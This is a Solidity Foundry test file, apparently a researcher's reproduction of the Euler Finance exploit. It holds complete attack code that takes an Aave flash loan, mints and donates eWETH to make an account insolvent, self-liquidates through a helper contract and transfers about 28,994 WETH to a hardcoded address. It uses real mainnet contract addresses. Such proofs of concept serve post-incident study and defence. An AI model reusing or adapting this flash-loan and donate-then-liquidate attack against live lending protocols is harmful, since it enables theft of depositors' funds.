// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";

// attack details: https://twitter.com/NumenAlert/status/1635222702721204225
// Copyright Reserved by Numen Cyber Technology：https://twitter.com/numencyber
// Use GNU General Public License v3.0
interface Euler{

}
interface WETH{
    function balanceOf(address addr) external view returns(uint256);
    function approve(address guy, uint wad) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
}
interface EWETH{
    function deposit(uint subAccountId, uint amount) external;
    function mint(uint subAccountId, uint amount) external;
    function donateToReserves(uint subAccountId, uint amount) external;
    function withdraw(uint subAccountId, uint amount) external;
}
interface AAVE{
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface DWETH{
    function repay(uint subAccountId, uint amount) external;
}
interface PROXY{
    struct LiquidationOpportunity {
        uint repay;
        uint yield;
        uint healthScore;

        // Only populated if repay > 0:
        uint baseDiscount;
        uint discount;
        uint conversionRate;
    }
    function liquidate(address violator, address underlying, address collateral, uint repay, uint minYield) external;
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral) external returns (LiquidationOpportunity memory liqOpp);
}
contract SC{
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    WETH weth=WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    AAVE aave=AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    EWETH eweth=EWETH(0x1b808F49ADD4b8C6b5117d9681cF7312Fcf0dC1D);
    DWETH dweth=DWETH(0x62e28f054efc24b26A794F5C1249B6349454352C);
    function exp() public{
        SSCC sscc=new SSCC();
        weth.balanceOf(address(this));
        weth.approve(address(euler),type(uint256).max);
        eweth.deposit(0,13930000000000000000000);
        eweth.mint(0,139300000000000000000000);
        dweth.repay(0,6965000000000000000000);
        eweth.mint(0,139300000000000000000000);
        eweth.donateToReserves(0,69650000000000000000000);
        sscc.exp();
    }
}
contract SSCC{
    PROXY proxy=PROXY(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    WETH weth=WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    AAVE aave=AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    EWETH eweth=EWETH(0x1b808F49ADD4b8C6b5117d9681cF7312Fcf0dC1D);
    DWETH dweth=DWETH(0x62e28f054efc24b26A794F5C1249B6349454352C);
    function exp() public{
        PROXY.LiquidationOpportunity memory s=PROXY.LiquidationOpportunity({
        repay:0,
        yield:0,
        healthScore:0,

        // Only populated if repay > 0:
        baseDiscount:0,
        discount:0,
        conversionRate:0
        });
        s=proxy.checkLiquidation(address(this),address(0xCe71065D4017F316EC606Fe4422e11eB2c47c246),address(weth),address(weth));
        proxy.liquidate(address(0xCe71065D4017F316EC606Fe4422e11eB2c47c246),address(weth),address(weth),s.repay,220917440887765984786800);
        eweth.withdraw(0,28994303891868396965958);
        weth.transfer(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84),28994303891868396965958);
    }
}
contract CounterTest is Test {

    function setUp() public {
    }
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    WETH weth=WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    AAVE aave=AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address[] tokens;
    uint256[] nums1;
    uint256[] nums2;
    function testa() public{
        tokens.push(address(weth));
        nums1.push(20895000000000000000000);
        nums2.push(0);
        uint256 r0=weth.balanceOf(address(euler));
        aave.flashLoan(address(this),tokens,nums1,nums2,address(this),hex"000000000000000000000000000000000000000000000000000000000000519f0000000000000000000000000000000000000000000000000000000000022024000000000000000000000000000000000000000000000000000000000001101200000000000000000000000000000000000000000000000000000000000077b6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000001b808f49add4b8c6b5117d9681cf7312fcf0dc1d00000000000000000000000062e28f054efc24b26a794f5c1249b6349454352c",0);
        console2.log(weth.balanceOf(address(this)));
    }
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        SC sc=new SC();
        weth.approve(address(aave),type(uint256).max);
        weth.transfer(address(sc),nums1[0]);
        sc.exp();
        return true;
    }
}
